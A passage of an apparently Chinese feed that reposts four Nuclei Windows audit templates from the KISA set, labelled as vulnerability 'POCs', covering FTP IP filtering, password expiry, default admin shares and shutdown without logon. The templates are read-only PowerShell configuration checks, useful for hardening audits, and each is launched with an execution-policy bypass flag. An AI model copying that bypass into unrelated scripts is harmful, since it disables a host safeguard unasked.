    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> FTP Access Control Check</p><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> 确保通过配置IP地址过滤器限制FTP访问。没有这些限制，未经授权的网络可能会访问FTP服务。缺乏适当的基于IP的访问控制允许未经授权的网络访问FTP服务，增加了数据泄露和其他安全威胁的风险。</p><p><strong>产品厂商：</strong> Microsoft</p><p><strong>产品名称：</strong> IIS FTP</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/b740ee6791c0a6d36cac233d23a096ba91d2f060/code%2Fwindows%2Faudit%2Fkisa%2Fftp-access-control-check.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/b740ee6791c0a6d36cac233d23a096ba91d2f060/code%2Fwindows%2Faudit%2Fkisa%2Fftp-access-control-check.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><br>id: ftp<span class="hljs-literal">-access-control-check</span><br><br>info:<br>  name: FTP Access Control Check<br>  author: nukunga[<span class="hljs-type">SungHyunJeon</span>]<br>  severity: medium<br>  description: |<br>    Ensure FTP access is restricted by configuring IP address filters. Without these restrictions, unauthorized networks could potentially access FTP services.<br>  impact: |<br>    Lack of proper IP<span class="hljs-literal">-based</span> access control allows FTP services to be accessed by unauthorized networks, heightening the risk of <span class="hljs-keyword">data</span> breaches and other security threats.<br>  remediation: |<br>    <span class="hljs-built_in">Set</span> up IP address restrictions <span class="hljs-keyword">using</span> IIS Manager:<br>    - Open IIS Manager.<br>    - Go to the FTP site → FTP IP Address and Domain Restrictions.<br>    - Add the allowed IP addresses and configure suitable deny rules.<br>  reference:<br>    - https://isms.kisa.or.kr/main/csap/notice/?boardId=bbs_0000000000000004&amp;mode=view&amp;cntId=<span class="hljs-number">85</span><br>  tags: ftp,iis,security,windows,code,windows<span class="hljs-literal">-audit</span>,kisa<br><br>self<span class="hljs-literal">-contained</span>: true<br><br>code:<br>  - pre<span class="hljs-literal">-condition</span>: |<br>      IsWindows();<br>    engine:<br>      - powershell<br>      - powershell.exe<br>    args:<br>      - <span class="hljs-literal">-ExecutionPolicy</span><br>      - Bypass<br>    pattern: <span class="hljs-string">&quot;*.ps1&quot;</span><br>    source: |<br>      <span class="hljs-built_in">Import-Module</span> WebAdministration <span class="hljs-literal">-ErrorAction</span> SilentlyContinue<br>      <span class="hljs-variable">$ftpSites</span> = <span class="hljs-built_in">Get-ChildItem</span> IIS:\Sites | <span class="hljs-built_in">Where-Object</span> &#123; <span class="hljs-variable">$_</span>.Bindings.Collection.Protocol <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;ftp&quot;</span> &#125;<br>      <span class="hljs-variable">$vulnerable</span> = <span class="hljs-variable">$false</span><br>      <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$site</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$ftpSites</span>) &#123;<br>          <span class="hljs-variable">$ipSecurity</span> = <span class="hljs-built_in">Get-WebConfigurationProperty</span> <span class="hljs-literal">-pspath</span> <span class="hljs-string">&quot;MACHINE/WEBROOT/APPHOST/<span class="hljs-variable">$</span>(<span class="hljs-variable">$site</span>.Name)&quot;</span> <span class="hljs-literal">-filter</span> <span class="hljs-string">&quot;system.ftpServer/security/ipSecurity&quot;</span> <span class="hljs-literal">-name</span> <span class="hljs-string">&quot;allowUnlisted&quot;</span> <span class="hljs-literal">-ErrorAction</span> SilentlyContinue<br>          <span class="hljs-comment"># If allowUnlisted is true, FTP access is open to unlisted IPs (i.e., no proper IP restriction is applied)</span><br>          <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ipSecurity</span> <span class="hljs-operator">-eq</span> <span class="hljs-variable">$true</span>) &#123;<br>              <span class="hljs-variable">$vulnerable</span> = <span class="hljs-variable">$true</span><br>              <span class="hljs-keyword">break</span><br>          &#125;<br>      &#125;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$vulnerable</span>) &#123;<br>          <span class="hljs-string">&quot;FTP_IP_ACCESS_CONTROL_NOT_CONFIGURED&quot;</span><br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-string">&quot;FTP_IP_ACCESS_CONTROL_CONFIGURED&quot;</span><br>      &#125;<br><br>    matchers:<br>      - <span class="hljs-built_in">type</span>: word<br>        words:<br>          - <span class="hljs-string">&quot;FTP_IP_ACCESS_CONTROL_NOT_CONFIGURED&quot;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; FTP Access Control Check&lt;/p&gt;
&lt;p&gt;&lt;strong</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    
  </entry>
  
  <entry>
    <title>Windows Password Expiry Setting Check Vulnerability</title>
    <link href="http://example.com/2025/06/26/github_1519212792/"/>
    <id>http://example.com/2025/06/26/github_1519212792/</id>
    <published>2025-06-26T11:16:27.904Z</published>
    <updated>2025-06-26T11:16:27.902Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Windows Password Expiry Setting Check Vulnerability</p><p><strong>漏洞类型：</strong> 弱口令</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> 确保所有活动用户账户的“密码永不过期”设置被禁用，以便密码过期策略可以有效执行。启用“密码永不过期”设置会覆盖最大密码年龄策略，阻止其执行，增加凭证被泄露的可能性。</p><p><strong>产品厂商：</strong> Microsoft</p><p><strong>产品名称：</strong> Windows Server</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/b740ee6791c0a6d36cac233d23a096ba91d2f060/code%2Fwindows%2Faudit%2Fkisa%2Fpassword-never-expires.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/b740ee6791c0a6d36cac233d23a096ba91d2f060/code%2Fwindows%2Faudit%2Fkisa%2Fpassword-never-expires.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> password-never-expires<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Password Expiry Setting Check<br>  <span class="hljs-params">author:</span> nukunga[SungHyunJeon]<br>  <span class="hljs-params">severity:</span> medium<br>  <span class="hljs-params">description:</span><br>    Ensure the <span class="hljs-string">&quot;Password never expires&quot;</span> setting is disabled for all active user accounts so that password expiration policies can be enforced effectively.<br>  <span class="hljs-params">impact:</span> |<br>    Enabling the <span class="hljs-string">&quot;Password never expires&quot;</span> setting overrides the maximum password age policy, preventing its enforcement and increasing the likelihood of credential compromise.<br>  <span class="hljs-params">remediation:</span> |<br>    Disable the <span class="hljs-string">&quot;Password never expires&quot;</span> setting using one of the following <span class="hljs-params">methods:</span><br>    <span class="hljs-operator">-</span> Command <span class="hljs-params">Line:</span> <span class="hljs-operator">&gt;</span> wmic useraccount where name<span class="hljs-operator">=</span><span class="hljs-string">&quot;USERNAME&quot;</span> set passwordexpires<span class="hljs-operator">=</span><span class="hljs-literal">true</span><br>    <span class="hljs-operator">-</span> <span class="hljs-params">GUI:</span> Use Local Security Policy to modify the user account settings accordingly.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>isms.kisa.<span class="hljs-keyword">or</span>.kr<span class="hljs-operator">/</span>main<span class="hljs-operator">/</span>csap<span class="hljs-operator">/</span>notice<span class="hljs-operator">/</span><span class="hljs-operator">?</span>boardId<span class="hljs-operator">=</span>bbs_0000000000000004&amp;mode<span class="hljs-operator">=</span>view&amp;cntId<span class="hljs-operator">=</span><span class="hljs-number">85</span><br>  <span class="hljs-params">tags:</span> code,windows-audit,kisa,account-management,password-policy<br><br><span class="hljs-params">self-contained:</span> <span class="hljs-literal">true</span><br><br><span class="hljs-params">code:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">pre-condition:</span> |<br>      IsWindows();<br><br>    <span class="hljs-params">engine:</span><br>      <span class="hljs-operator">-</span> powershell<br>      <span class="hljs-operator">-</span> powershell.exe<br><br>    <span class="hljs-params">args:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-operator">-</span>ExecutionPolicy<br>      <span class="hljs-operator">-</span> Bypass<br><br>    <span class="hljs-params">pattern:</span> <span class="hljs-string">&quot;*.ps1&quot;</span><br><br>    <span class="hljs-params">source:</span> |<br>      <span class="hljs-comment"># Check all local, active user accounts for the password expiry setting</span><br>      $users <span class="hljs-operator">=</span> Get-WmiObject <span class="hljs-operator">-</span>Class Win32_UserAccount <span class="hljs-operator">-</span>Filter <span class="hljs-string">&quot;LocalAccount=True and Disabled=False&quot;</span><br>      $vulnerable <span class="hljs-operator">=</span> $users | Where-Object &#123; $_.PasswordExpires <span class="hljs-operator">-</span>eq $<span class="hljs-literal">false</span> &#125;<br>      <span class="hljs-keyword">if</span> ($vulnerable) &#123;<br>          <span class="hljs-string">&quot;PASSWORD_NEVER_EXPIRES_ENABLED&quot;</span><br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-string">&quot;PASSWORD_NEVER_EXPIRES_DISABLED&quot;</span><br>      &#125;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;PASSWORD_NEVER_EXPIRES_ENABLED&quot;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Windows Password Expiry Setting Check V</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="弱口令" scheme="http://example.com/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>Windows 默认共享磁盘漏洞</title>
    <link href="http://example.com/2025/06/26/github_982386805/"/>
    <id>http://example.com/2025/06/26/github_982386805/</id>
    <published>2025-06-26T11:16:12.141Z</published>
    <updated>2025-06-26T11:16:12.138Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Windows 默认共享磁盘漏洞</p><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> 确保默认的管理共享（如C$、D$、Admin$）通过验证AutoShareServer注册表值设置为0而被禁用。这些共享如果保持启用状态，可能会将系统资源暴露给未经授权的访问。如果AutoShareServer注册表值设置为1或存在默认的管理共享（不包括IPC$），攻击者可能会利用它们来获取对系统资源的未经授权访问。</p><p><strong>产品厂商：</strong> Microsoft</p><p><strong>产品名称：</strong> Windows Server</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/b740ee6791c0a6d36cac233d23a096ba91d2f060/code%2Fwindows%2Faudit%2Fkisa%2Fhard-disk-default-share.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/b740ee6791c0a6d36cac233d23a096ba91d2f060/code%2Fwindows%2Faudit%2Fkisa%2Fhard-disk-default-share.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><br>id: hard<span class="hljs-literal">-disk-default-share</span><br><br>info:<br>  name: Hard Disk Default Share Removal Check<br>  author: nukunga[<span class="hljs-type">SungHyunJeon</span>]<br>  severity: medium<br>  description: |<br>    Ensure default administrative shares (e.g., C<span class="hljs-variable">$</span>, D<span class="hljs-variable">$</span>, Admin<span class="hljs-variable">$</span>) are disabled by verifying that the AutoShareServer registry value is <span class="hljs-built_in">set</span> to <span class="hljs-number">0</span>.<br>    Leaving these shares enabled can expose system resources to unauthorized access.<br>  impact: |<br>   <span class="hljs-keyword">If</span> the AutoShareServer registry value is <span class="hljs-built_in">set</span> to <span class="hljs-number">1</span> or default administrative shares (excluding IPC<span class="hljs-variable">$</span>) are present, attackers may exploit them to gain unauthorized access to system resources.<br>  remediation: |<br>    Permanently disable default administrative shares by setting the AutoShareServer registry value to <span class="hljs-number">0</span> at:<br>    - HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters<br>    - Additionally, remove any non<span class="hljs-literal">-essential</span> default shares <span class="hljs-keyword">using</span> the appropriate system management tools.<br>  reference:<br>    - https://isms.kisa.or.kr/main/csap/notice/?boardId=bbs_0000000000000004&amp;mode=view&amp;cntId=<span class="hljs-number">85</span><br>  tags: ftp,iis,code,windows<span class="hljs-literal">-audit</span>,kisa,share<span class="hljs-literal">-permissions</span><br><br>self<span class="hljs-literal">-contained</span>: true<br><br>code:<br>  - pre<span class="hljs-literal">-condition</span>: |<br>      IsWindows();<br>    engine:<br>      - powershell<br>      - powershell.exe<br>    args:<br>      - <span class="hljs-literal">-ExecutionPolicy</span><br>      - Bypass<br>    pattern: <span class="hljs-string">&quot;*.ps1&quot;</span><br>    source: |<br>      <span class="hljs-variable">$vulnerable</span> = <span class="hljs-variable">$false</span><br>      <span class="hljs-comment"># Check the AutoShareServer registry value</span><br>      <span class="hljs-variable">$regPath</span> = <span class="hljs-string">&#x27;HKLM:\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters&#x27;</span><br>      <span class="hljs-variable">$autoShare</span> = (<span class="hljs-built_in">Get-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$regPath</span> <span class="hljs-literal">-Name</span> AutoShareServer <span class="hljs-literal">-ErrorAction</span> SilentlyContinue).AutoShareServer<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$autoShare</span> <span class="hljs-operator">-eq</span> <span class="hljs-number">1</span>) &#123;<br>          <span class="hljs-variable">$vulnerable</span> = <span class="hljs-variable">$true</span><br>      &#125;<br>      <span class="hljs-comment"># Retrieve list of shared folders using &#x27;net share&#x27;</span><br>      <span class="hljs-variable">$netShares</span> = net share | <span class="hljs-built_in">Out-String</span><br>      <span class="hljs-variable">$lines</span> = <span class="hljs-variable">$netShares</span> <span class="hljs-operator">-split</span> <span class="hljs-string">&quot;`n&quot;</span><br>      <span class="hljs-variable">$shareNames</span> = <span class="hljs-selector-tag">@</span>()<br>      <span class="hljs-variable">$startParsing</span> = <span class="hljs-variable">$false</span><br>      <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$line</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$lines</span>) &#123;<br>          <span class="hljs-keyword">if</span> (<span class="hljs-variable">$line</span> <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;^-+&quot;</span>) &#123;<br>              <span class="hljs-variable">$startParsing</span> = <span class="hljs-variable">$true</span><br>              <span class="hljs-keyword">continue</span><br>          &#125;<br>          <span class="hljs-keyword">if</span> (<span class="hljs-variable">$startParsing</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$line</span>.Trim() <span class="hljs-operator">-ne</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$line</span> <span class="hljs-operator">-notmatch</span> <span class="hljs-string">&quot;The command completed successfully&quot;</span>) &#123;<br>              <span class="hljs-variable">$tokens</span> = <span class="hljs-variable">$line</span>.Trim() <span class="hljs-operator">-split</span> <span class="hljs-string">&quot;\s+&quot;</span><br>              <span class="hljs-keyword">if</span> (<span class="hljs-variable">$tokens</span>.Count <span class="hljs-operator">-gt</span> <span class="hljs-number">0</span>) &#123;<br>                  <span class="hljs-variable">$shareNames</span> += <span class="hljs-variable">$tokens</span>[<span class="hljs-number">0</span>]<br>              &#125;<br>          &#125;<br>      &#125;<br>      <span class="hljs-comment"># Define default shares to check (excluding IPC$)</span><br>      <span class="hljs-variable">$defaultShares</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-string">&quot;C<span class="hljs-variable">$</span>&quot;</span>, <span class="hljs-string">&quot;D<span class="hljs-variable">$</span>&quot;</span>, <span class="hljs-string">&quot;Admin<span class="hljs-variable">$</span>&quot;</span>)<br>      <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$share</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$shareNames</span>) &#123;<br>          <span class="hljs-keyword">if</span> (<span class="hljs-variable">$defaultShares</span> <span class="hljs-operator">-contains</span> <span class="hljs-variable">$share</span>) &#123;<br>              <span class="hljs-variable">$vulnerable</span> = <span class="hljs-variable">$true</span><br>              <span class="hljs-keyword">break</span><br>          &#125;<br>      &#125;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$vulnerable</span>) &#123;<br>          <span class="hljs-string">&quot;DEFAULT_SHARE_VULNERABLE&quot;</span><br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-string">&quot;DEFAULT_SHARE_COMPLIANT&quot;</span><br>      &#125;<br><br>    matchers:<br>      - <span class="hljs-built_in">type</span>: word<br>        words:<br>          - <span class="hljs-string">&quot;DEFAULT_SHARE_VULNERABLE&quot;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Windows 默认共享磁盘漏洞&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞类型：&lt;/</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    
  </entry>
  
  <entry>
    <title>Windows Shutdown Without Logon Check Vulnerability</title>
    <link href="http://example.com/2025/06/26/github_244114779/"/>
    <id>http://example.com/2025/06/26/github_244114779/</id>
    <published>2025-06-26T11:15:59.635Z</published>
    <updated>2025-06-26T11:15:59.630Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Windows Shutdown Without Logon Check Vulnerability</p><p><strong>漏洞类型：</strong> 配置问题</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> 当启用’Shutdown Without Logon’策略时，系统允许从登录屏幕关机，增加了未经授权关机的风险。这可能导致服务中断。修复建议是通过将ShutdownWithoutLogon注册表值设置为0来禁用此策略。</p><p><strong>产品厂商：</strong> Microsoft</p><p><strong>产品名称：</strong> Windows</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/b740ee6791c0a6d36cac233d23a096ba91d2f060/code%2Fwindows%2Faudit%2Fkisa%2Fshutdown-without-logon.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/b740ee6791c0a6d36cac233d23a096ba91d2f060/code%2Fwindows%2Faudit%2Fkisa%2Fshutdown-without-logon.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> shutdown-without-logon<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Shutdown Without Logon Check<br>  <span class="hljs-params">author:</span> nukunga[SungHyunJeon]<br>  <span class="hljs-params">severity:</span> medium<br>  <span class="hljs-params">description:</span> |<br>    Ensure the <span class="hljs-string">&quot;Shutdown Without Logon&quot;</span> policy is disabled by confirming that the ShutdownWithoutLogon registry value is set to <span class="hljs-number">0</span>. If enabled, the system permits shutdown from the logon screen, increasing the risk of unauthorized shutdowns.<br>  <span class="hljs-params">impact:</span> |<br>    When enabled, this setting permits unauthorized users to shut down the system without logging <span class="hljs-keyword">in</span>, which can lead to service interruptions.<br>  <span class="hljs-params">remediation:</span> |<br>    Disable this policy by setting the ShutdownWithoutLogon registry value to <span class="hljs-number">0</span> <span class="hljs-params">at:</span><br>    <span class="hljs-operator">-</span> HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System<br>    <span class="hljs-operator">-</span> Alternatively, configure the setting through the Local Security Policy.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>isms.kisa.<span class="hljs-keyword">or</span>.kr<span class="hljs-operator">/</span>main<span class="hljs-operator">/</span>csap<span class="hljs-operator">/</span>notice<span class="hljs-operator">/</span><span class="hljs-operator">?</span>boardId<span class="hljs-operator">=</span>bbs_0000000000000004&amp;mode<span class="hljs-operator">=</span>view&amp;cntId<span class="hljs-operator">=</span><span class="hljs-number">85</span><br>  <span class="hljs-params">tags:</span> code,windows-audit,kisa,registry<br><br><span class="hljs-params">self-contained:</span> <span class="hljs-literal">true</span><br><br><span class="hljs-params">code:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">pre-condition:</span> |<br>      IsWindows();<br>    <span class="hljs-params">engine:</span><br>      <span class="hljs-operator">-</span> powershell<br>      <span class="hljs-operator">-</span> powershell.exe<br>    <span class="hljs-params">args:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-operator">-</span>ExecutionPolicy<br>      <span class="hljs-operator">-</span> Bypass<br>    <span class="hljs-params">pattern:</span> <span class="hljs-string">&quot;*.ps1&quot;</span><br>    <span class="hljs-params">source:</span> |<br>      $regPath <span class="hljs-operator">=</span> <span class="hljs-string">&quot;HKLM:<span class="hljs-char escape_">\S</span>oftware<span class="hljs-char escape_">\M</span>icrosoft<span class="hljs-char escape_">\W</span>indows<span class="hljs-char escape_">\C</span>urrentVersion<span class="hljs-char escape_">\p</span>olicies<span class="hljs-char escape_">\s</span>ystem&quot;</span><br>      $shutdownValue <span class="hljs-operator">=</span> (Get-ItemProperty <span class="hljs-operator">-</span>Path $regPath <span class="hljs-operator">-</span>Name ShutdownWithoutLogon <span class="hljs-operator">-</span>ErrorAction SilentlyContinue).ShutdownWithoutLogon<br>      <span class="hljs-keyword">if</span> ($shutdownValue <span class="hljs-operator">-</span>eq <span class="hljs-number">0</span>) &#123;<br>          <span class="hljs-string">&quot;SHUTDOWN_WITHOUT_LOGON_DISABLED&quot;</span><br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-string">&quot;SHUTDOWN_WITHOUT_LOGON_ENABLED&quot;</span><br>      &#125;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;SHUTDOWN_WITHOUT_LOGON_ENABLED&quot;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
